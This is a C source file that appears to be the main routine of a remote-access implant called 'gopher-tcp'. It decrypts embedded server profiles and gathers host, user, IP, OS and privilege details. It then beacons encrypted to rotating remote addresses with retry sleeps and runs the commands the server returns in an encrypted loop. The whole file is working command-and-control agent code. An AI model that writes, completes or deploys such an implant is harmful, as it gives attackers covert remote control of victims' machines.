//
// Created by seba on 10/17/26.
//

#include "common.h"
#include "config.h"
#include "profile.h"
#include "crypt.h"
#include "pack.h"
#include "net.h"
#include "os_info.h"
#include "tasks.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

static int      ACTIVE = 1;
static Profile *profiles     = NULL;
static uint8_t **enc_keys    = NULL;
static size_t   profile_count = 0;
static size_t   profile_index = 0;

static int decode_profiles(void) {
    for (size_t i = 0; i < enc_profiles_count; i++) {
        const uint8_t *blob = enc_profiles[i];
        size_t blob_len = sizeof(enc_profiles[i]);

        if (blob_len < 16) continue;

        uint8_t *key = malloc(16);
        if (!key) continue;
        memcpy(key, blob, 16);

        uint8_t *dec = NULL;
        size_t dec_len = 0;
        if (crypt_decrypt(blob + 16, blob_len - 16, key, 16, &dec, &dec_len) < 0) {
            free(key);
            continue;
        }

        Profile p = {0};
        if (pack_decode_profile(dec, dec_len, &p) < 0) {
            free(key);
            free(dec);
            continue;
        }
        free(dec);

        profiles = realloc(profiles, (profile_count + 1) * sizeof(Profile));
        enc_keys = realloc(enc_keys, (profile_count + 1) * sizeof(uint8_t *));
        profiles[profile_count] = p;
        enc_keys[profile_count] = key;
        profile_count++;
    }

    DBG("decoded %zu profile(s)\n", profile_count);
    return (profile_count > 0) ? 0 : -1;
}

static uint8_t *build_init_msg(uint32_t agent_id, const Profile *prof, const SessionInfo *info, const uint8_t *enc_key, size_t *out_len) {
    // 1. marshal SessionInfo
    uint8_t *si_data = NULL;
    size_t si_len = 0;
    if (pack_encode_session_info(info, &si_data, &si_len) < 0) return NULL;

    // 2. marshal InitPack{id, type, data=sessionInfo}
    InitPack ip = { .id = agent_id, .type = prof->type, .data = si_data, .data_len = si_len };
    uint8_t *ip_data = NULL;
    size_t ip_len = 0;
    int rc = pack_encode_init_pack(&ip, &ip_data, &ip_len);
    free(si_data);
    if (rc < 0) return NULL;

    // 3. marshal StartMsg{type=INIT_PACK, data=initPack}
    StartMsg sm = { .type = 1, .data = ip_data, .data_len = ip_len };
    uint8_t *sm_data = NULL;
    size_t sm_len = 0;
    rc = pack_encode_start_msg(&sm, &sm_data, &sm_len);
    free(ip_data);
    if (rc < 0) return NULL;

    // 4. encrypt with profile's encKey
    uint8_t *encrypted = NULL;
    size_t enc_len = 0;
    rc = crypt_encrypt(sm_data, sm_len, enc_key, 16, &encrypted, &enc_len);
    free(sm_data);
    if (rc < 0) return NULL;

    *out_len = enc_len;
    return encrypted;
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    DBG("gopher-tcp starting\n");

    // decode baked-in profiles
    if (decode_profiles() < 0) {
        DBG("no valid profiles, exiting\n");
        return 1;
    }

    // collect system info + generate session key
    SessionInfo info;
    os_collect_info(&info);
    uint8_t session_key[16];
    memcpy(session_key, info.encrypt_key, 16);

    DBG("host=%s user=%s ip=%s os=%s pid=%d elevated=%d\n", info.host, info.user, info.ipaddr, info.os_version, info.pid, info.elevated);

    // generate random AgentId
    uint8_t id_bytes[4];
    crypt_random(id_bytes, 4);
    uint32_t agent_id = ((uint32_t)id_bytes[0] << 24) | ((uint32_t)id_bytes[1] << 16) | ((uint32_t)id_bytes[2] << 8)  | ((uint32_t)id_bytes[3]);
    DBG("agent_id=0x%08X\n", agent_id);

    // build encrypted init message
    Profile *prof = &profiles[profile_index];
    uint8_t *enc_key = enc_keys[profile_index];

    size_t init_len = 0;
    uint8_t *init_msg = build_init_msg(agent_id, prof, &info, enc_key, &init_len);
    if (!init_msg) {
        DBG("failed to build init message\n");
        session_info_free(&info);
        return 1;
    }

    DBG("init message built (%zu bytes)\n", init_len);

    tasks_init(prof, enc_key, session_key, agent_id);

    // reconnect loop
    size_t addr_index = 0;
    for (int i = 0; i < prof->conn_count && ACTIVE; i++) {
        if (i > 0) {
            sleep((unsigned)prof->conn_timeout);
            addr_index++;
            if (addr_index >= prof->addr_count) {
                addr_index = 0;
                profile_index = (profile_index + 1) % profile_count;
                prof = &profiles[profile_index];
                enc_key = enc_keys[profile_index];

                free(init_msg);
                init_msg = build_init_msg(agent_id, prof, &info, enc_key, &init_len);
                tasks_init(prof, enc_key, session_key, agent_id);
                if (!init_msg) continue;
            }
        }

        // parse host:port from address string
        const char *addr = prof->addresses[addr_index];
        char host_buf[256] = {0};
        uint16_t port = 0;

        const char *colon = strrchr(addr, ':');
        if (!colon) continue;
        size_t hlen = (size_t)(colon - addr);
        if (hlen >= sizeof(host_buf)) continue;
        memcpy(host_buf, addr, hlen);
        host_buf[hlen] = '\0';
        port = (uint16_t)atoi(colon + 1);

        DBG("connecting to %s:%u (attempt %d/%d)\n", host_buf, port, i + 1, prof->conn_count);

        int fd = net_connect(host_buf, port);
        if (fd < 0) continue;
        i = 0;  // reset retry counter on successful connect

        // recv banner
        if (prof->banner_size > 0) {
            uint8_t *banner = malloc((size_t)prof->banner_size);
            if (!banner || net_recv_exact(fd, banner, (size_t)prof->banner_size) < 0) {
                free(banner);
                net_close(fd);
                continue;
            }
            free(banner);
            DBG("banner received (%d bytes)\n", prof->banner_size);
        }

        // send init
        if (net_send_msg(fd, init_msg, (uint32_t)init_len) < 0) {
            net_close(fd);
            continue;
        }
        DBG("init sent\n");

        // command loop
        while (ACTIVE) {
            uint8_t *recv_data = NULL;
            uint32_t recv_len = 0;
            if (net_recv_msg(fd, &recv_data, &recv_len) < 0) break;

            // decrypt with session key
            uint8_t *plain = NULL;
            size_t plain_len = 0;
            if (crypt_decrypt(recv_data, recv_len, session_key, 16, &plain, &plain_len) < 0) {
                free(recv_data);
                break;
            }
            free(recv_data);

            // unmarshal Message
            Message in_msg = {0};
            if (pack_decode_message(plain, plain_len, &in_msg) < 0) {
                free(plain);
                break;
            }
            free(plain);

            // prepare response
            Message out_msg = { .type = 0, .objects = NULL, .object_lens = NULL, .object_count = 0 };

            if (in_msg.type == 1) {
                out_msg.type = 1;

                uint8_t **results = NULL;
                size_t *result_lens = NULL;
                size_t result_count = 0;

                for (size_t ci = 0; ci < in_msg.object_count; ci++) {
                    Command cmd = {0};
                    if (pack_decode_command(in_msg.objects[ci], in_msg.object_lens[ci], &cmd) < 0)
                        continue;

                    DBG("command code=%u id=%u\n", cmd.code, cmd.id);

                    if (task_process(&cmd, &ACTIVE) < 0) {
                        free(cmd.data);
                        continue;
                    }

                    uint8_t *resp = NULL;
                    size_t resp_len = 0;
                    if (pack_encode_command(&cmd, &resp, &resp_len) == 0) {
                        results     = realloc(results, (result_count + 1) * sizeof(uint8_t *));
                        result_lens = realloc(result_lens, (result_count + 1) * sizeof(size_t));
                        results[result_count]     = resp;
                        result_lens[result_count] = resp_len;
                        result_count++;
                    }

                    free(cmd.data);
                }

                out_msg.objects      = results;
                out_msg.object_lens  = result_lens;
                out_msg.object_count = result_count;
            }

            message_free(&in_msg);

            // marshal + encrypt + send response
            uint8_t *resp_data = NULL;
            size_t resp_len = 0;
            if (pack_encode_message(&out_msg, &resp_data, &resp_len) < 0) break;

            uint8_t *resp_enc = NULL;
            size_t resp_enc_len = 0;
            if (crypt_encrypt(resp_data, resp_len, session_key, 16, &resp_enc, &resp_enc_len) < 0) {
                free(resp_data);
                break;
            }
            free(resp_data);

            int send_rc = net_send_msg(fd, resp_enc, (uint32_t)resp_enc_len);
            free(resp_enc);

            // free response objects
            if (out_msg.objects) {
                for (size_t ci = 0; ci < out_msg.object_count; ci++) free(out_msg.objects[ci]);
                free(out_msg.objects);
                free(out_msg.object_lens);
            }

            if (send_rc < 0) break;
        }

        net_close(fd);
        DBG("disconnected\n");
    }

    // cleanup
    free(init_msg);
    session_info_free(&info);
    for (size_t i = 0; i < profile_count; i++) {
        profile_free(&profiles[i]);
        free(enc_keys[i]);
    }
    free(profiles);
    free(enc_keys);

    DBG("gopher-tcp exiting\n");
    return 0;
}
